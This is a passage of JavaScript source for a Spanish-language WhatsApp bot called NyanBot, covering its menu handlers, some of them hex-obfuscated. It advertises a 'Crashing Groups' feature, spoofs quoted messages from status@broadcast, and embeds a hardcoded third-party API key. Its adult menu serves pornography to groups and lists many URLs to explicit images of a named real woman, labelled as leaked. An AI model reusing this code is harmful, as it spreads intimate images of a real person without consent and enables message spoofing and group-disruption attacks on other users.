							"buttonText": "Selecciona tu menu",
							"listType": "SINGLE_SELECT",
							"sections": [
								{
									"rows": [
										{
											"title": `Menu de Media📷`,
											"rowId": "media"
										},
										{
											"title": `Menu de Grupos👥`,
											"rowId": "grupos"
										},
										{
											"title": "Menu de Descargas📲",
											"rowId": "descargas"
										},
										{
											"title": "Comandos para Adultos🔞",
											"rowId": "+18"
										},
                                        {
											"title": `Juegos🎮`,
											"rowId": "juegos"
										},
										{
											"title": "🍉INFORMACION🏹",
											"rowId": `thanksto`
										}
									]
								}
							]
						}
					}, {})
				samu330.relayWAMessage(newmenu, {waitForAck: true})
				var _0x4fdf=["","\x48\x6F\x6C\x61\x2C\x20\x47\x72\x61\x63\x69\x61\x73\x20\x70\x6F\x72\x20\x75\x73\x61\x72\x20\x6D\x69\x20\x62\x6F\x74\x2C\x20\x45\x73\x74\x65\x20\x6D\x65\x6E\x73\x61\x6A\x65\x20\x73\x6F\x6C\x6F\x20\x6C\x6F\x20\x70\x75\x65\x64\x65\x73\x20\x76\x65\x72\x20\x74\x75\x2C\x20\x65\x6C\x20\x64\x75\x65\xF1\x6F\x20\x64\x65\x6C\x20\x62\x6F\x74\x2C\x20\x65\x73\x74\x65\x20\x6D\x65\x6E\x73\x61\x6A\x65\x20\x65\x73\x20\x70\x61\x72\x61\x20\x69\x6D\x76\x69\x74\x61\x72\x74\x65\x20\x61\x20\x61\x70\x6F\x79\x61\x72\x6D\x65\x20\x65\x6E\x20\x6D\x69\x20\x63\x61\x6E\x61\x6C\x20\x64\x65\x20\x79\x6F\x75\x74\x75\x62\x65\x2C\x20\x6D\x65\x20\x61\x70\x6F\x79\x61\x72\x69\x61\x73\x20\x6D\x75\x63\x68\x6F\x21\u2728","\u2728\x52\x65\x63\x75\x65\x72\x64\x61\x20\x73\x69\x65\x6D\x70\x72\x65\x20\x61\x63\x74\x75\x61\x6C\x69\x7A\x61\x72\x2C\x20\x79\x61\x20\x71\x75\x65\x20\x73\x65\x20\x61\x67\x72\x65\x67\x61\x6E\x20\x6D\x61\x73\x20\x66\x75\x6E\x63\x69\x6F\x6E\x65\x73\x2E\x5C\x6E\x5C\x6E\x54\x6F\x63\x61\x20\x65\x6C\x20\x42\x6F\x74\x6F\x6E\x20\x64\x65\x20\x61\x62\x61\x6A\x6F\x20\x70\x61\x72\x61\x20\x72\x65\x67\x61\x6C\x61\x72\x6D\x65\x20\x74\x75\x20\x73\x75\x73\x63\x72\x69\x70\x63\x69\x69\x6E\x2C\x20\x4D\x75\x63\x68\x61\x73\x20\x67\x72\x61\x63\x69\x61\x73\x20\x64\x65\x20\x61\x6E\x74\x65\x6D\x61\x6E\x6F\x20\x70\x6F\x72\x20\x75\x73\x61\x72\x20\x4D\x69\x20\x62\x6F\x74\uD83D\uDC96\x5C\x6E\x54\x45\x20\x41\x47\x52\x41\x44\x45\x43\x45\x20\x53\x41\x4D\x55\x33\x33\x30\uD83C\uDFF9","\x43\x6C\x69\x63\x6B\x20\x50\x61\x72\x61\x20\x69\x72\x20\x61\x20\x6D\x69\x20\x43\x61\x6E\x61\x6C\x2E\x2E\x2E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x63\x68\x61\x6E\x6E\x65\x6C\x2F\x55\x43\x48\x44\x34\x54\x38\x50\x66\x63\x76\x35\x50\x46\x56\x7A\x73\x41\x62\x66\x41\x50\x5A\x41","\x70\x72\x65\x70\x61\x72\x65\x4D\x65\x73\x73\x61\x67\x65\x46\x72\x6F\x6D\x43\x6F\x6E\x74\x65\x6E\x74","\x72\x65\x6C\x61\x79\x57\x41\x4D\x65\x73\x73\x61\x67\x65"];reshb1=  await samu330[_0x4fdf[5]](from,{"\x74\x65\x6D\x70\x6C\x61\x74\x65\x4D\x65\x73\x73\x61\x67\x65":{"\x68\x79\x64\x72\x61\x74\x65\x64\x46\x6F\x75\x72\x52\x6F\x77\x54\x65\x6D\x70\x6C\x61\x74\x65":{"\x68\x79\x64\x72\x61\x74\x65\x64\x43\x6F\x6E\x74\x65\x6E\x74\x54\x65\x78\x74":_0x4fdf[0],"\x68\x79\x64\x72\x61\x74\x65\x64\x46\x6F\x6F\x74\x65\x72\x54\x65\x78\x74":_0x4fdf[0],"\x68\x79\x64\x72\x61\x74\x65\x64\x42\x75\x74\x74\x6F\x6E\x73":[{"\x75\x72\x6C\x42\x75\x74\x74\x6F\x6E":{"\x64\x69\x73\x70\x6C\x61\x79\x54\x65\x78\x74":_0x4fdf[0],"\x75\x72\x6C":_0x4fdf[0]},"\x69\x6E\x64\x65\x78":1}]},"\x68\x79\x64\x72\x61\x74\x65\x64\x54\x65\x6D\x70\x6C\x61\x74\x65":{"\x68\x79\x64\x72\x61\x74\x65\x64\x43\x6F\x6E\x74\x65\x6E\x74\x54\x65\x78\x74":`${_0x4fdf[1]}`,"\x68\x79\x64\x72\x61\x74\x65\x64\x46\x6F\x6F\x74\x65\x72\x54\x65\x78\x74":`${_0x4fdf[2]}`,"\x68\x79\x64\x72\x61\x74\x65\x64\x42\x75\x74\x74\x6F\x6E\x73":[{"\x75\x72\x6C\x42\x75\x74\x74\x6F\x6E":{"\x64\x69\x73\x70\x6C\x61\x79\x54\x65\x78\x74":`${_0x4fdf[3]}`,"\x75\x72\x6C":_0x4fdf[4]},"\x69\x6E\x64\x65\x78":0}]}}},{});samu330[_0x4fdf[6]](reshb1)
				break

}




			if (sam.message.buttonsResponseMessage){
				test = sam.message.buttonsResponseMessage.selectedButtonId
				if (test.includes(`mnan`)){
				sendButLocation(from, `\n➫
🔐Hola *${pushname}* ${timeFt}
_Tipo de usuario:_ ${tipoDeUsr}
┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✨XP: ${getLevelingXp(sender)}
📚Nivel: ${getLevelingLevel(sender)}
┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈
											
🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*
															
༶•┈┈•༶`, ``, fs.readFileSync('./src/NyanBot.jpg'),
				[{buttonId: 'm1', 
				buttonText: 
				{displayText: '[📑] Leer Instrucciones'}, 
				type: 1}], 
				{quoted: sam, contextInfo: { forwardingScore: 508, isForwarded: true, sendEphemeral: true}})
			}
			}

			if (sam.message.buttonsResponseMessage){
				test = sam.message.buttonsResponseMessage.selectedButtonId
				if (test.includes(`m1`)){
			reply(`No ves el Mensaje de lista?\n\n🥏 Probablemente el Bot este registrado en un WhatsApp Bussines, este tipo de mensajes son incompatibles con ese WhatsApp.\n\n*Ves la lista, pero no puedes abrir las secciones?*\n\n🔍 Esto pasa por usar un WhatsApp Mod, para arreglar este problema, sige estas instrucciones:\n\n- Dirijete a los ajustes o mods de tu WhatsApp.\n- Busca y selecciona el apartado de "Pantalla de Conversacion".\n- Entra a la Seccion de "burbujas y ticks".\n- Dirigete hacia la parte de abajo, encontraras un Switch con el nombre "Hacer el Texto Seleccionable", desactiva esa funcion.\n\n🧾 *Una vez ya desactivada esa funcion, podras ver y usar el Mensaje de Lista.*`)
			}
			}

			if (sam.message.buttonsResponseMessage){
				test = sam.message.buttonsResponseMessage.selectedButtonId
				if (test.includes(`tbsm`)){
			reply(`*Mi canal de YouTube:*\n\nhttps://www.youtube.com/channel/UCHD4T8Pfcv5PFVzsAbfAPZA`)
			}
			}



            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`media`)){
                    if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy insane, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
                    trol = fs.readFileSync('./media/trol.mp4')
                    samu330.sendMessage(from, trol, video, {mimetype: 'video/mp4', caption: `${mda}`, duration: -9999999, thumbnail: fs.readFileSync('./media/reply.png'), sendEphemeral: true, quoted:
                    { key: {
                    fromMe: false,
                    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                    "imageMessage": { "caption": "🧸𝙈𝙀𝙉𝙐⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼📌", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
                    }})
		    samu330.sendMessage(from, fs.readFileSync('./temp/nana.mp3'), audio, {quoted: ftoko, mimetype: "audio/mp3", ptt: true, duration: 5555555, sendEphermeral: true})
                    addFilter(from)
                    addLevelingLevel(sender, 5)
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`sticker`)){
                    if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
                    samu330.sendMessage(from, `${stc}`, MessageType.text, {quoted:
                    { key: {
                    fromMe: false,
                    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                    "documentMessage": { "title": "📚𝑆𝑡𝑖𝑘𝑒𝑟 𝑚𝑒𝑛𝑢", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
                    }})
                    addFilter(from)
                    addLevelingLevel(sender, 5)	
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`grupos`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    uptime = process.uptime()
                    addFilter(from)
                    addLevelingLevel(sender, 5)		
                    samu330.sendMessage(from, Menug, MessageType.text, {
                    quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "➫𝑴𝒆𝒏𝒖 𝑫𝒆 𝑮𝒓𝒖𝒑𝒐𝒔\n❣️⃞🔥𝙎꯭𝙖͠𝙢꯭ 𝙔 ꯭𝙋꯭𝙚𝙧𝙧꯭𝙮🔥❣️" ,"jpegThumbnail": fs.readFileSync(`./NyanBot.jpg`)}}}})
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`descargas`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    uptime = process.uptime()
                    samu330.sendMessage(from, `${Menud}`, MessageType.text, {
                    quoted:  fvid})
                    addFilter(from)
                    addLevelingLevel(sender, 5)	
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`tools`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    samu330.sendMessage(from, `${Menu8}`, MessageType.text, {
                    quoted: ftoko})
                    addFilter(from)
                    addLevelingLevel(sender, 5)	
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`logos`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    uptime = process.uptime()
                    samu330.sendMessage(from, `${Menu7}`, MessageType.text, {
                    quoted: fvid})
                    addFilter(from)
                    addLevelingLevel(sender, 5)
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`owner`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    samu330.sendMessage(from, `${Menu8}`, MessageType.text, {
                    quoted: ftoko})
                    addFilter(from)
                    addLevelingLevel(sender, 5)	
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`crash`)){
                    if (!isRegister) return reply(mess.only.usrReg)
                    reply('*Gathering information...*')
                    smww = fs.readFileSync(`./media/SmWW.png`)
                    samu330.sendMessage(from, smww, image, {caption: `${menu9}`, quoted: { key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, ...(from ? {
                            remoteJid: "status@broadcast" } : {}) }, 
                                message: { 
                                    "imageMessage": { 
                                    "mimetype": 
                                    "image/jpeg", 
                                    "caption": "➫'*👑Samu330 Crashing Groups!!🔥*'\n'😈Samu330 Domina🥀'" ,
                                    "jpegThumbnail": fs.readFileSync(`./src/ara.png`)}}}})
			}
			}

var _0x4dab=["\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x6D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x52\x6F\x77\x49\x64","\x73\x69\x6E\x67\x6C\x65\x53\x65\x6C\x65\x63\x74\x52\x65\x70\x6C\x79","\x40\x6C\x69\x73\x74","\x65\x6E\x64\x73\x57\x69\x74\x68","","\x73\x70\x6C\x69\x74","\x2A\x45\x6E\x76\x69\x61\x6E\x64\x6F\x20\x61\x72\x63\x68\x69\x76\x6F\x2E\x2E\x2E\x2A\x0D\x0A\x5F\x54\x69\x74\x75\x6C\x6F\x3A\x20","\x5F\x0D\x0A\x5F\x44\x75\x72\x61\x63\x69\x6F\x6E\x3A\x20","\x74\x69\x6D\x65\x73\x74\x61\x6D\x70","\x61\x6C\x6C","\x5F\x0D\x0A\x4C\x69\x6E\x6B\x20\x64\x65\x6C\x20\x56\x69\x64\x65\x6F\x3A\x20","\x75\x72\x6C","\x6C\x69\x6E\x6B","\x61\x75\x64\x69\x6F\x2F\x6D\x70\x34","\x40\x6C\x69\x73\x74\x33","\x42\x79\x20\x53\x61\x6D\x75\x33\x33\x30\uD83C\uDF52","\x40\x6C\x69\x73\x74\x31","\x2A\x45\x6E\x76\x69\x61\x6E\x64\x6F\x20\x61\x72\x63\x68\x69\x76\x6F\x20\x65\x6E\x20\x4E\x6F\x74\x61\x20\x64\x65\x20\x56\x6F\x7A\x2E\x2E\x2E\x2A\x0D\x0A\x5F\x54\x69\x74\x75\x6C\x6F\x3A\x20","\x40\x6C\x69\x73\x74\x32","\x45\x6E\x76\x69\x61\x6E\x64\x6F\x20\x61\x72\x63\x68\x69\x76\x6F\x20\x63\x6F\x6D\x6F\x20\x4E\x6F\x74\x61\x20\x64\x65\x20\x76\x6F\x7A\x2E\x2E\x2E\x0D\x0A\x5F\x54\x69\x74\x75\x6C\x6F\x3A\x20","\x0D\x0A\x5F\x44\x75\x72\x61\x63\x69\x6F\x6E\x3A\x20","\x0D\x0A\x4C\x69\x6E\x6B\x20\x64\x65\x6C\x20\x56\x69\x64\x65\x6F\x3A\x20"];if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[4]}`)){let orlist= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[4])}${_0x4dab[6]}`);reply(`${_0x4dab[8]}${test[_0x4dab[7]](_0x4dab[4])}${_0x4dab[9]}${orlist[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[12]}${orlist[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg= await y2mateA(`${_0x4dab[6]}${orlist[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}};if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[18]}`)){let orlist1= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[18])}${_0x4dab[6]}`);reply(`${_0x4dab[19]}${test[_0x4dab[7]](_0x4dab[18])}${_0x4dab[9]}${orlist1[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[12]}${orlist1[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg1= await y2mateA(`${_0x4dab[6]}${orlist1[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg1[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],ptt:true,contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist1[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}};if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[20]}`)){let orlist11= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[20])}${_0x4dab[6]}`);reply(`${_0x4dab[8]}${test[_0x4dab[7]](_0x4dab[20])}${_0x4dab[9]}${orlist11[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[12]}${orlist11[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg11= await y2mateA(`${_0x4dab[6]}${orlist11[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg11[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],duration:-777,contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist11[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}};if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[16]}`)){let orlist111= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`);reply(`${_0x4dab[21]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[22]}${orlist111[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[23]}${orlist111[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg111= await y2mateA(`${_0x4dab[6]}${orlist111[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg111[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],ptt:true,duration:-777,contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist111[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}}



			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`+18`)){
					addFilter(from)
					addLevelingLevel(sender, 5)		
					samu330.sendMessage(from, { degreesLatitude: `0`, degreesLongitude: `0`, name: '🔥insane🍒', address : `🗡Created by Samu330`, sequenceNumber: '99999', jpegThumbnail: fs.readFileSync('./src/+18.jpg')}, MessageType.liveLocation, {quoted : sam})
					let nopor = samu330.prepareMessageFromContent(from, {
					"listMessage":  {
					"title": "*😏Bienvenido al menu 6*",
					"description": `\n\nQue es lo que buscas🍒?\n\n	*Si no puedes ver, o selccionar la lsita de mensajes de abajo, desactiva la opcion de "Hacer el texto seleccionable", en las configuraciones de conversacion de tu WhatsApp Mod.*`,
					"buttonText": "Click Aqui",
					"listType": "SINGLE_SELECT",
					"sections": [
					{
					"rows": [
					{
					"title": "Imagenes Filtradas De la Hermosa Belle Delphine😏!!",
					"rowId": `${prefix}belle`
					},
					{
					"title": "🍑VIDEO UNICO Y EXCLUSIVO PARA LOS USUARIOS DE NYANBOT👑✍🏻",
					"rowId": `VIP`
					},	
					{
					"title": `Porno Real🔥`,
					"rowId": `${prefix}porno`
					},
					{
					"title": "Porno de Lesbianas😊",
					"rowId": `${prefix}lesbian`
					},
					{
						"title": `Bonitas Tetas🍇`,
						"rowId": `${prefix}tetas`
						},
						{
						"title": "Culos Hermosos🍑",
						"rowId": `${prefix}ass`
						},
						{
							"title": `Pussy's🥟`,
							"rowId": `${prefix}pussy`
							},
							{
							"title": "Waifu Hentai🌸",
							"rowId": `${prefix}xwaifu`
							},
							{
								"title": "Neko Hentai🍒",
								"rowId": `${prefix}xneko`
								},
								{
								"title": "Trap Hentai🍌",
								"rowId": `${prefix}trap`
								},
								{
									"title": "Blow Hentai🍆",
									"rowId": `${prefix}blow`
									}
					]
					}
					]
					}
					}, {})
					samu330.relayWAMessage(nopor, {waitForAck: true})
			}
			}
            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`juegos`)){
                    reply(`🎮 *Juegos* 🍒
- ${prefix}ttt
_TicTacToe_

- ${prefix}lucky
_Juego de suerte_

- ${prefix}dados
_Ps DADOS!!_`)
                }
            }
			
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`audios`)){
					addFilter(from)
					reply(`*Estos audios son originales, provenientes de la app:*\nhttps://play.google.com/store/apps/details?id=com.aromaticnectarineapps.anime\n\n- anana\n- asen\n- flash\n- hentai\n- jai\n- jashire\n- kareta\n- kataka\n- kicks\n- kobarashi\n- mitamita\n- mma\n- motomoto\n- nani\n- niconico\n- nya\n- nyan\n- omaiga\n- omaiwa\n- omg\n- onichan\n- ooaa\n- piano\n- pikachu\n- pupu\n- sempai\n- sss\n- suspenso\n- talcho\n- tobec\n- tuturu\n- tututu\n- uchinchi\n- uff\n- uma\n- umai\n- unga\n- woau\n- yajaro\n- yame\n- yamete\n- yokese\n- yutki\n- ñaña\n- ñañañi\n\n🍒 *By Samu330* 💠`)
			}
			}

            

			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}lesbian`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					porn = await getJson('https://meme-api.herokuapp.com/gimme/lesbians', {
					method: 'get'
					})
					 
					buffer = await getBuffer(`${porn.url}`)
					samu330.sendMessage(from, buffer, image, {
					fimg})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}tetas`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					pw = ["https://meme-api.herokuapp.com/gimme/tits",
					"https://meme-api.herokuapp.com/gimme/BestTits",
					"https://meme-api.herokuapp.com/gimme/boobs",
					"https://meme-api.herokuapp.com/gimme/amazingtits",
					"https://meme-api.herokuapp.com/gimme/TinyTits"]
					nk = pw[Math.floor(Math.random() * pw.length)]
					porn = await getJson(`${nk}`, {
					method: 'get'
					})
					 
					buffer = await getBuffer(`${porn.url}`)
					samu330.sendMessage(from, buffer, image, {
					quoted: fimg
					})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}ass`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					pw = ["https://meme-api.herokuapp.com/gimme/CuteLittleButts",
					"https://meme-api.herokuapp.com/gimme/ass",
					"https://meme-api.herokuapp.com/gimme/boobs",
					"https://meme-api.herokuapp.com/gimme/ass"]
					nk = pw[Math.floor(Math.random() * pw.length)]
					porn = await getJson(`${nk}`, {
					method: 'get'
					})
					 
					buffer = await getBuffer(`${porn.url}`)
					samu330.sendMessage(from, buffer, image, {
					quoted: fimg
					})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}porno`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					pornito = ["https://fxc7-api.herokuapp.com/api/amateur?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal_gape?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/asian?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass-fucking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/japanese?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/babe?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ball_licking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/bath?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal_penetration?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/areolae?apikey=Fxc7"]
					nopor = pornito[Math.floor(Math.random() * pornito.length)]
					reply('*Espera un momento porfavor*')
					iwant = await getJson(`${nopor}`, {method: 'get'})
					you = await getBuffer(`${iwant.result}`)
					sendFile(you, sam, '🍒')
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}pussy`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					pw = ["https://meme-api.herokuapp.com/gimme/pussy",
					"https://meme-api.herokuapp.com/gimme/LegalTeens"
					]
					nk = pw[Math.floor(Math.random() * pw.length)]
					porn = await getJson(`${nk}`, {
					method: 'get'
					})
					 
					buffer = await getBuffer(`${porn.url}`)
					samu330.sendMessage(from, buffer, image, {
					quoted: fimg
					})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}belle`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					bd = ["https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-1-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-2-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-3-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-4-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-5-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-6-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-7-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-8-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-9-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-10.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-11-715x384.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-12-715x385.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-13-715x385.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-13-715x385.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-14-715x385.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-15.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-15.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-17.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-17.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-18.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-19.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-20.jpg", 